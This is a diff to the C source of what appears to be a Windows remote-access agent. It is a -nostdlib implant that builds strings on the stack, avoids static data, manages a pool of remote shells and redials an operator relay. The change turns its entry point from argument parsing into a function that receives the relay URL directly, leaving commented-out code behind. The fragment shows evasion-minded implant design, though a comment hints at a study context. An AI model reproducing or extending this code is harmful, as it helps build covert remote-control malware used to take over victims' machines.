@@ -94,7 +94,7 @@
 #include "kernel32.h"
 #include "entry.h"      /* agent_main: the -nostdlib entry contract */
 #include "stackstrings.h" /* runtime strings, built on the stack */
-
+#include "environment.h"  /* access to environment variables */
 
 /* Commit tag baked into the identity frame. CI overrides it with
  * -DAGENT_COMMIT_HASH="<8-char git hash>"; local builds keep the study tag. */
@@ -306,40 +306,19 @@ static DWORD handle_close_shell(const agent_ctx *ctx, const incoming_message *ms
 /* One full connect/serve/close session (defined below main). */
 static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived);
 
-INT32 agent_main(INT32 argc, CHAR *argv[])
+INT32 agent_main(const WCHAR *url)
 {
     KERNEL32 kernel;
     if (!KERNEL32_Ctor(&kernel)) {
         LOG_ERROR("Failed to load kernel32.dll\n");
     }
    
-    const CHAR *url_arg = NULL;
-    int verbose_flag = 0;   /* -v; travels into ctx below */
-    int start = (argc >= 2) ? 1 : 0;
-    for (int i = start; i < argc; i++) {
-        if (strcmp(argv[i], "-v") == 0) {
-            verbose_flag = 1;
-            continue;
-        }
-        if (url_arg == NULL)
-            url_arg = argv[i];
-    }
-
-    if (url_arg == NULL && argc == 1 && argv[0] != NULL && strcmp(argv[0], "-v") != 0)
-        url_arg = argv[0];
-
-    if (url_arg == NULL) {
-        const CHAR *prog = (argc > 0 && argv[0]) ? argv[0] : "minimal_agent.exe";
-        LOG_ERROR("Usage: %s <URL> [-v]\n", prog);
-        return 1;
-    }
-
     /* Process-lifetime storage, in declaration order of first use:
      * the URL, the shell pool, the redial backoff steps and the context
      * that bundles them for the call tree. agent_main does not return
      * until the agent exits, so these frame locals live as long as any
      * static would - without a byte of static storage. */
-    WCHAR url[2048];
+    ///WCHAR url[2048];
     shell_slot shells[SHELL_POOL_SIZE];
     /* Uninitialized on purpose: an array initializer like {1,2,4,8,16,32}
      * counts as initialized DATA - the compiler pools it and copies it
@@ -356,12 +335,12 @@ INT32 agent_main(INT32 argc, CHAR *argv[])
 
     MemoryZero(shells, sizeof(shells));   /* all slots start free */
     ctx.shells  = shells;
-    ctx.verbose = verbose_flag;
+    //ctx.verbose = verbose_flag;
     ctx.winhttp = NULL;                   /* run_session fills it */
-    if (AnsiToWide(url_arg, url, 2048) == -1) {
-        LOG_ERROR("AnsiToWide(URL) failed\n");
-        return 1;
-    }
+    // if (AnsiToWide(url_arg, url, 2048) == -1) {
+    //     LOG_ERROR("AnsiToWide(URL) failed\n");
+    //     return 1;
+    // }
 
     /* ----- The agent loop: dial, serve, redial. A lost connection is a
      * normal event (the relay drops agent sockets when the paired operator
